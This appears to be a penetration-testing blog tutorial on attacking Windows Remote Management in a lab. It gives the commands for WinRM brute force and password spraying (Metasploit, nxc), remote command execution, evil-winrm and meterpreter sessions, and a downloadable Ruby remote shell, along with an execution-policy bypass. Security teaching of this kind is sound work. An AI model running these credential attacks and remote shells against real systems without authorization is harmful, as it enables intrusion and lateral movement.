@@ -1,0 +1,211 @@
+Home»Red Teaming»WinRM Penetration Testing
+Red Teaming
+WinRM Penetration Testing
+July 15, 2024 by Raj
+Windows Remote Management (WinRM) is a protocol developed by Microsoft for remotely managing hardware and operating systems on Windows machines. It is a component of the Windows Management Framework and implements the WS-Management Protocol, which is a standard web services protocol designed for remote management of software and hardware. WS-Management is based on SOAP and supports the XML schema. WinRM uses port 5985 for HTTP transport and 5986 for HTTPS Transport.
+
+Table of Contents
+Lab Setup
+Testing the connection
+Lateral Movement (Locally)
+Connecting server using Enter-PSSession
+Connecting server using winrs
+Connecting server using PowerShell
+Lateral Movement (Remotely)
+Scanning
+Identifying the WinRM authentication methods
+WinRM login brute force
+Password spray using nxc
+Exploiting WinRM using Metasploit
+Connecting remote shell using docker
+Connecting remote shell using Ruby script
+Conclusion
+Lab Setup
+Target Machine: Windows Server 2019 (192.168.31.70)
+
+Standalone Individual Machine: Windows 10
+
+Attacker Machine: Kali Linux (192.168.31.141)
+
+To Perform lab setup, we need to enable and configure the WinRM service on both the server and an individual machine. Here we are using the Windows 10 as an individual machine and the server as Windows Server 2019.
+
+First we will configure the WinRM using PowerShell on the Windows Server 2019, the following procedure can be used:
+
+Execution Policy Bypass:
+In order to run some scripts or perform any task the execution policy needs to be bypassed. This method does not change the system-wide execution policy and only applies to the current PowerShell session. Following is the command:
+
+powershell -ep bypass
+Enable-PSRemoting:
+The Enable-PSRemoting cmdlet configures the computer to receive PowerShell remote commands that are sent by using the WS-Management technology. Following is the command:
+
+Enable-PSRemoting -force
+WinRM config:
+By default, WinRM listens on port 5985 for HTTP and 5986 for HTTPS.  Also, there is a flexibility to allow connections from specific remote hosts. Here we are using the wildcard character (*) for all the machines on the network. Following are the commands:
+
+winrm quickconfig -transport:https
+Set-Item wsman:\localhost\client\trustedhosts *
+Restart service:
+After the configuration is complete, now the service can be restarted using the following command:
+
+Restart-Service WinRM
+
+
+There is one more configuration that we need to do is to add the administrator user in the local group Remote Management Users.
+
+net localgroup "Remote Management Users" /add administrator
+
+
+Now to configure on the individual machine, we are going to perform the same action which we followed in case of server configuration. It can be noticed that Enable-PSRemoting command gives an error however the command will be executed successfully.
+
+
+
+Testing the connection
+We can check the connection using test-wsman, if the connection is successful then the command will return the version details.
+
+test-wsman -computername "192.168.31.70"
+
+
+Lateral Movement (Locally)
+Since the service is active, now we can try different ways to move laterally by directly using the WinRM service. Here we are assuming that we have already obtained the initial access in the system as a user now we are trying to move laterally.
+
+Connecting server using Enter-PSSession
+The Enter-PSSession can be used to connect to the remote server using the ComputerName parameter which is the machine we want to connect and the Credential as the account name which is trusted for remote connections. Once the connection is maintained we can run the system commands.
+
+Enter-PSSession -ComputerName 192.168.31.70 -Credential administrator
+systeminfo
+
+
+Connecting server using winrs
+winrs is another command which uses WinRM service to connect to remote systems and execute the commands.
+
+winrs -r:192.168.31.70 -u:workstation\administrator -p:Ignite@987 ipconfig
+
+
+It can also be used to get an interactive shell where we can run the commands afterwards directly.
+
+winrs -r:192.168.31.70 -u:workstation\administrator -p:Ignite@987 CMD
+
+
+Connecting server using Powershell
+There is one more method to connect using the powershell Invoke-Command, here we need to give the host in the ComputerName parameter, account name in the Credential parameter and the Authentication type is set as Negotiate. When we use Negotiate, it means that PowerShell will initially use the Kerberos authentication if not successful it will fall back to NTLM. However, for the systems which are not in domain environment, we need to give the Credential. Here we can give the command in the ScriptBlock parameter.
+
+Invoke-Command -ComputerName "192.168.31.70" -Credential workgroup\administrator -Authentication Negotiate -Port 5985 -ScriptBlock {ipconfig /all}
+
+
+We can also create an object as cred which will take the pass as an argument. To create a SecureString we need to give the -AsPlainText and -Force parameters otherwise it will give an error. The created pass string can be passed as a variable in the cred object created using the System.Management.Automatic namespace using the PSCredential class.
+
+$pass = ConvertTo-SecureString 'Ignite@987' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ('workstation\administrator', $pass)
+Invoke-Command -ComputerName 192.168.31.70 -Credential $cred -ScriptBlock { ipconfig }
+
+
+Lateral Movement (Remotely)
+Scanning
+To connect with the WinRM service remotely, first we need to perform the enumeration.
+
+nmap -p5985,5986 -sV 192.168.31.70
+It can be seen that the port 5985 is open and it supports the HTTP for WinRM connections.
+
+
+
+Identifying the WinRM authentication methods
+The winrm_auth_methods auxiliary in Metasploit module can be used to determine the authentication methods. If the WinRM is supported this auxiliary will
+
+use auxiliary/scanner/winrm/winrm_auth_methods
+set rhosts 192.168.31.70
+run
+
+
+WinRM login brute force
+The brute force on WinRM can also be performed to enumerate the successful credentials. Here we are using the auxiliary/scanner/winrm/winrm_login inside Metasploit module. Here we are keeping the DOMAIN as default i.e., WORKSTATION. We can specify the usernames in user_file and the passwords in the pass_file.
+
+use auxiliary/scanner/winrm/winrm_login
+set rhosts 192.168.31.70
+set user_file users.txt
+set pass_file pass.txt
+set password N/A
+run
+sessions 1
+It can be seen that once the valid credentials are found, the session is obtained.
+
+
+
+Password spray using nxc
+nxc can be used to perform password spray on the WinRM service, we just need to pass the username and password file as input.
+
+nxc winrm 192.168.31.70 -u users.txt -p pass.txt
+
+
+Once the valid username and password is obtained we can login into the remote system using evil-winrm tool.
+
+evil-winrm -i 192.168.31.70 -u administrator -p Ignite@987
+
+
+We can also directly run the commands by giving the -x flag using nxc, after the valid credentials are found.
+
+nxc winrm 192.168.31.70 -u administrator -p Ignite@987 -x ipconfig
+
+
+Exploiting WinRM using Metasploit
+Once we have found the valid credentials, we can perform command execution using the auxiliary/scanner/winrm/winrm_cmd inside Metasploit. Following are the commands:
+
+use auxiliary/scanner/winrm/winrm_cmd
+set cmd ipconfig
+set username administrator
+set password Ignite@987
+run
+
+
+We can also take the meterpreter session, one we have the valid credentials. The exploit/windows/winrm/winrm_script_exec can be used to execute the script. This exploit automatically tries to perform privilege escalation by migrating to a system level process.
+
+use exploit/windows/winrm/winrm_script_exec
+set rhosts 192.168.31.70
+set username administrator
+set password Ignite@987
+run
+
+
+WQL (WMI Query Language) is a specialized subset of SQL (Structured Query Language) designed for querying data within the Windows Management Instrumentation (WMI) framework.
+
+Once valid credentials for the WinRM service are obtained, the WMI functionality can be exploited to execute arbitrary WQL queries on the target system. The module will also store the results of these queries as loot.
+
+Here we can give the query to fetch the service Name and Status from the Win32_Service.
+
+use auxiliary/scanner/winrm/winrm_wql
+set rhosts 192.168.31.70
+set username administrator
+set password Ignite@987
+set wql Select Name,Status from Win32_Service
+run
+ 
+
+Connecting remote shell using docker
+We can execute a Docker image of PowerShell with NTLM support to allow for PS-Remoting from Linux to Windows. After the connection we can supply the valid credentials and get the session through Enter-PSSession.
+
+docker run -it quickbreach/powershell-ntlm
+$creds = Get-Credential
+Enter-PSSession -ComputerName 192.168.31.70 -Authentication Negotiate -Credential $creds
+
+
+Connecting remote shell using Ruby script
+We can also connect to the remote server which has WinRM enabled using a ruby script. The script can be downloaded from here:
+
+https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell_with_upload.rb
+
+We need to modify this script by giving a valid username, password and endpoint.
+
+cat winrm_shell_with_upload.rb
+
+
+Once we have modified the script, we can execute it using ruby.
+
+ruby winrm_shell_with_upload.rb
+ipconfig /all
+
+
+Conclusion
+WinRM is a very useful service in day to day tasks, however if not configured properly it can be abused by attackers to gain shell access. Hence it is recommended to give the authentication permissions to only trusted users and not everyone.
+
+Reference:
+
+https://infra.newerasec.com/infrastructure-testing/enumeration/services-ports/winrm
